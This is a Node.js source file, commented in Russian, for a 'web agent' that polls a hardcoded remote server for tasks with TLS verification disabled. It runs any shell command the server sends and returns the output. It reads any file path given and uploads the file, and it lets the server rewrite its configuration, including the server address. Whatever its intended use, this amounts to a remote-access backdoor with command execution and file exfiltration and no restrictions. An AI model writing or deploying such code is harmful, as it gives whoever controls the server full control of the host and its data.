process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
require('dotenv').config();
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const FormData = require('form-data');

/* ===================== КОНФИГУРАЦИЯ ===================== */
const CONFIG = {
  UID: 'sviat-008',
  descr: 'web-agentik1',
  access_code: '57756a-4310-f6f0-26fe-17fe4ea9',
  server: 'https://xdev.arkcom.ru:9999/app/webagent1/api',
  interval: 10000   // мс
};

let pollTimer = null;

/* ===================== ЗАПРОС ЗАДАНИЯ ===================== */
async function getTask() {
  try {
    const res = await axios.post(`${CONFIG.server}/wa_task/`, {
      UID: CONFIG.UID,
      descr: CONFIG.descr,
      access_code: CONFIG.access_code
    });

    console.log('[getTask] Ответ сервера:', res.data);   // ← новый лог
    return res.data;
  } catch (e) {
    console.error('Ошибка запроса задания:', e.message);
    return null;
  }
}

/* ===================== ОТПРАВКА РЕЗУЛЬТАТА ===================== */
async function sendResult(session_id, result_code, message, fileBuffer = null, fileName = null) {
  try {
    const form = new FormData();
    form.append('result_code', String(result_code));
    form.append('result', JSON.stringify({
      UID: CONFIG.UID,
      access_code: CONFIG.access_code,
      message: message,
      files: fileBuffer ? 1 : 0,
      session_id: session_id
    }));

    if (fileBuffer && fileName) {
      form.append('file', fileBuffer, { filename: fileName });
    }

    const res = await axios.post(`${CONFIG.server}/wa_result/`, form, {
      headers: form.getHeaders(),
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });
    console.log(`[sendResult] session=${session_id} code=${result_code} ответ:`, res.data);
  } catch (e) {
    console.error('[sendResult] Ошибка отправки:', e.message);
  }
}

/* ===================== ОБРАБОТЧИКИ ===================== */

// FILE — прочитать файл и вернуть его содержимое
async function handleFile(task) {
  const filePath = (task.options || '').trim();
  console.log(`[FILE] path="${filePath}"`);

  if (!filePath) {
    await sendResult(task.session_id, -1, 'Не указан путь к файлу');
    return;
  }

  try {
    const resolvedPath = path.resolve(filePath);

    if (!fs.existsSync(resolvedPath)) {
      await sendResult(task.session_id, -1, `Файл не найден: ${filePath}`);
      return;
    }

    const fileBuffer = fs.readFileSync(resolvedPath);
    const fileName   = path.basename(resolvedPath);
    console.log(`[FILE] Отправляю файл: ${fileName} (${fileBuffer.length} байт)`);
    await sendResult(task.session_id, 0, `Файл получен: ${fileName}`, fileBuffer, fileName);
  } catch (e) {
    console.error('[FILE] Ошибка:', e.message);
    await sendResult(task.session_id, -1, e.message);
  }
}

// TASK — выполнить команду и вернуть stdout/stderr
async function handleTaskRun(task) {
  const command = (task.options || '').trim();
  console.log(`[TASK] command="${command}"`);

  if (!command) {
    await sendResult(task.session_id, -1, 'Не указана команда для выполнения');
    return;
  }

  return new Promise((resolve) => {
    exec(command, { timeout: 30000 }, async (error, stdout, stderr) => {
      if (error) {
        const code = (typeof error.code === 'number') ? error.code : -1;
        const msg  = (stderr || error.message || 'Ошибка выполнения').trim();
        console.error(`[TASK] Ошибка (code=${code}):`, msg);
        await sendResult(task.session_id, code, msg);
      } else {
        const output = (stdout || stderr || 'Команда выполнена успешно').trim();
        console.log('[TASK] Результат:', output);
        await sendResult(task.session_id, 0, output);
      }
      resolve();
    });
  });
}

// CONF — изменить конфигурационный параметр (формат: key=value)
async function handleConf(task) {
  const options = (task.options || '').trim();
  console.log(`[CONF] options="${options}"`);

  const eqIdx = options.indexOf('=');
  if (eqIdx === -1) {
    await sendResult(task.session_id, -1, 'Неверный формат. Используйте: key=value');
    return;
  }

  const key   = options.slice(0, eqIdx).trim();
  const value = options.slice(eqIdx + 1).trim();

  if (!key) {
    await sendResult(task.session_id, -1, 'Ключ не может быть пустым');
    return;
  }

  CONFIG[key] = value;
  console.log(`[CONF] ${key} = ${value}`);
  await sendResult(task.session_id, 0, `Параметр "${key}" установлен в "${value}"`);
}

// TIMEOUT — изменить интервал опроса (options = секунды)
async function handleTimeout(task) {
  const raw = (task.options || '').trim();
  console.log(`[TIMEOUT] options="${raw}"`);

  const seconds = parseFloat(raw);

  if (isNaN(seconds) || seconds <= 0) {
    await sendResult(task.session_id, -1, `Неверное значение интервала: "${raw}". Укажите число секунд > 0`);
    return;
  }

  const newInterval = Math.round(seconds * 1000); // → миллисекунды
  CONFIG.interval = newInterval;

  // Перезапускаем таймер с новым интервалом
  restartPoll();

  console.log(`[TIMEOUT] Интервал опроса изменён на ${seconds} сек (${newInterval} мс)`);
  await sendResult(task.session_id, 0, `Интервал опроса изменён на ${seconds} сек`);
}

/* ===================== ДИСПЕТЧЕР ===================== */
async function dispatch(task) {
  console.log(`\n[dispatch] task_code=${task.task_code} session=${task.session_id} options="${task.options}"`);

  switch (task.task_code) {
    case 'FILE':    await handleFile(task);    break;
    case 'TASK':    await handleTaskRun(task); break;
    case 'CONF':    await handleConf(task);    break;
    case 'TIMEOUT': await handleTimeout(task); break;
    default:
      console.warn('[dispatch] Неизвестный task_code:', task.task_code);
      await sendResult(task.session_id, -1, `Неизвестный task_code: ${task.task_code}`);
  }
}

/* ===================== ПОЛЛИНГ ===================== */
async function poll() {
  console.log(`[poll] Опрос сервера (интервал=${CONFIG.interval}мс)...`);
  const task = await getTask();

  if (task && task.status === 'RUN') {
    await dispatch(task);
  } else {
    console.log('[poll] Нет активных заданий.');
  }
}

function restartPoll() {
  if (pollTimer) clearInterval(pollTimer);
  pollTimer = setInterval(poll, CONFIG.interval);
  console.log(`[restartPoll] Таймер перезапущен с интервалом ${CONFIG.interval} мс`);
}

/* ===================== СТАРТ ===================== */
restartPoll();
poll();